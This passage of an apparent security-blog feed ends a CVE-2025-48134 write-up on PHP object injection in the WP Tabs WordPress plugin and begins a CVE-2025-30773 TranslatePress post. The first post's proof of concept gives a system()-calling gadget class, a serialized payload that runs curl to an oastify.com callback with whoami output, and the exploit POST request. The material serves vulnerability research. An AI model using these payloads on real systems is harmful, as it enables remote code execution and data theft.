{&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;shortcode1&#34;: {&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;meta&#34;: {&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;sp_tab_source_options&#34;: &#34;serialized_payload&#34;&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;}&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;}&#xA;&amp;ensp;&amp;ensp;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;&#xD;&#xA;A[&#34;Administrator&amp;ensp;uploads&amp;ensp;JSON&amp;ensp;via&amp;ensp;/wp-admin/admin-ajax.php?action=tabs_import_shortcode&#34;]&amp;ensp;--&gt;&amp;ensp;B[&#34;import_shortcode()&amp;ensp;invoked&#34;]&#xD;&#xA;&#xD;&#xA;B&amp;ensp;--&gt;&amp;ensp;C{&#34;Check&amp;ensp;nonce:&amp;ensp;wp_verify_nonce()&#34;}&#xD;&#xA;C&amp;ensp;--&gt;|Fail|&amp;ensp;X[&#34;Stop&amp;ensp;&amp;&amp;ensp;return&amp;ensp;error:&amp;ensp;Nonce&amp;ensp;verification&amp;ensp;failed&#34;]&#xD;&#xA;C&amp;ensp;--&gt;|Pass|&amp;ensp;D[&#34;json_decode()&amp;ensp;twice&amp;ensp;â†’&amp;ensp;extract&amp;ensp;$shortcodes&#34;]&#xD;&#xA;&#xD;&#xA;D&amp;ensp;--&gt;|Empty/Invalid|&amp;ensp;Y[&#34;Stop&amp;ensp;&amp;&amp;ensp;return&amp;ensp;error:&amp;ensp;Nothing&amp;ensp;to&amp;ensp;import&#34;]&#xD;&#xA;D&amp;ensp;--&gt;|Valid|&amp;ensp;E[&#34;Call&amp;ensp;import($shortcodes)&#34;]&#xD;&#xA;&#xD;&#xA;E&amp;ensp;--&gt;&amp;ensp;F[&#34;Loop&amp;ensp;through&amp;ensp;each&amp;ensp;shortcode&#34;]&#xD;&#xA;F&amp;ensp;--&gt;&amp;ensp;H{&#34;Has&amp;ensp;&#39;meta&#39;&amp;ensp;and&amp;ensp;is&amp;ensp;array?&#34;}&#xD;&#xA;H&amp;ensp;--&gt;|No|&amp;ensp;Z[&#34;Skip&amp;ensp;entry&#34;]&#xD;&#xA;H&amp;ensp;--&gt;|Yes|&amp;ensp;I[&#34;Loop&amp;ensp;each&amp;ensp;meta&amp;ensp;field&#34;]&#xD;&#xA;&#xD;&#xA;I&amp;ensp;--&gt;&amp;ensp;J{&#34;Key&amp;ensp;==&amp;ensp;&#39;sp_tab_source_options&#39;&amp;ensp;OR&amp;ensp;&#39;sp_tab_shortcode_options&#39;?&#34;}&#xD;&#xA;J&amp;ensp;--&gt;|No|&amp;ensp;Z&#xD;&#xA;J&amp;ensp;--&gt;|Yes|&amp;ensp;K[&#34;Replace&amp;ensp;{#ID#}&amp;ensp;with&amp;ensp;new&amp;ensp;ID&#34;]&#xD;&#xA;&#xD;&#xA;K&amp;ensp;--&gt;&amp;ensp;L[&#34;maybe_unserialize()&amp;ensp;â†&amp;ensp;Vulnerable&#34;]&#xD;&#xA;&#xD;&#xA;L&amp;ensp;--&gt;&amp;ensp;M{&#34;Does&amp;ensp;unserialize&amp;ensp;create&amp;ensp;object?&#34;}&#xD;&#xA;M&amp;ensp;--&gt;|Yes|&amp;ensp;R[&#34;Object&amp;ensp;Injection&amp;ensp;â†’&amp;ensp;Possible&amp;ensp;RCE&amp;ensp;if&amp;ensp;malicious&amp;ensp;class&amp;ensp;exists&#34;]&#xD;&#xA;M&amp;ensp;--&gt;|No|&amp;ensp;S[&#34;Sanitize&amp;ensp;+&amp;ensp;update_post_meta()&amp;ensp;and&amp;ensp;continue&#34;]&#xD;&#xA;&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a test class in &lt;code&gt;wp-config.php&lt;/code&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nc&#34;&gt;Evil&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$command&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ls&amp;ensp;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;fm&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Import JSON file:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;shortcode&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;shortcode1&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;meta&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;sp_tab_source_options&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;O:4:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Evil&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;:1:{s:7:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;;s:75:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;curl&amp;ensp;http://m7uzxda0q6dtl9sp5pvah7vuilocc30s.oastify.com/?leadked=$(whoami)&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;;}&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-HTTP&#34; data-lang=&#34;HTTP&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;POST&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nn&#34;&gt;/wp-admin/admin-ajax.php&lt;/span&gt;&amp;ensp;&lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;localhost&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Cookie&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;administrator_cookie&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;shortcode=%22%7B%5Cr%5Cn++%5C%22shortcode%5C%22%3A+%7B%5Cr%5Cn++++%5C%22shortcode1%5C%22%3A+%7B%5Cr%5Cn++++++%5C%22meta%5C%22%3A+%7B%5Cr%5Cn++++++++%5C%22sp_tab_source_options%5C%22%3A+%5C%22O%3A4%3A%5C%5C%5C%22Evil%5C%5C%5C%22%3A1%3A%7Bs%3A7%3A%5C%5C%5C%22command%5C%5C%5C%22%3Bs%3A75%3A%5C%5C%5C%22curl+http%3A%2F%2Fm7uzxda0q6dtl9sp5pvah7vuilocc30s.oastify.com%2F%3Fleadked%3D%24(whoami)%5C%5C%5C%22%3B%7D%5C%22%5Cr%5Cn++++++%7D%5Cr%5Cn++++%7D%5Cr%5Cn++%7D%5Cr%5Cn%7D%22&amp;amp;action=tabs_import_shortcode&amp;amp;nonce=b6d5e5977d&amp;amp;unSanitize=&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-24-cve-2025-48134/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-11-24-cve-2025-48134/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-24-cve-2025-48134/result.png&#39; alt=&#34;Result&#34; height=&#34;578&#34; width=&#34;1136&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h1&gt;&lt;p&gt;CVE-2025-48134 originates from insecure deserialization through &lt;code&gt;maybe_unserialize()&lt;/code&gt; during import, allowing &lt;strong&gt;PHP Object Injection&lt;/strong&gt; and possible RCE if a malicious class exists. Even though Administrator privileges and a valid nonce are required, the impact is still critical. Version 2.2.13 fixes this by preventing arbitrary object creation during unserialization.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;Root cause: uncontrolled deserialization of input&lt;/li&gt;&#xA;&lt;li&gt;Impact: Object Injection and Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;Administrator privileges required for exploitation&lt;/li&gt;&#xA;&lt;li&gt;Never unserialize user input without restricting classes or applying safe validation&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wp-expand-tabs-free/vulnerability/wordpress-wp-tabs-2-2-11-php-object-injection-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Tabs Plugin &amp;lt;= 2.2.12 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-30773 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-23-cve-2025-30773/</link>
      <pubDate>Sun, 23 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-23-cve-2025-30773/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-23-cve-2025-30773/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability is a Deserialization of Untrusted Data issue in Cozmoslabs TranslatePress, which allows for Object Injection. This issue affects TranslatePress from n/a up to version 2.9.6.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-30773&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-30773&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.9.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.9.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/translatepress-multilingual/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress TranslatePress Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; â€“ &lt;strong&gt;TranslatePress&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.9.6&lt;/code&gt; â€“ 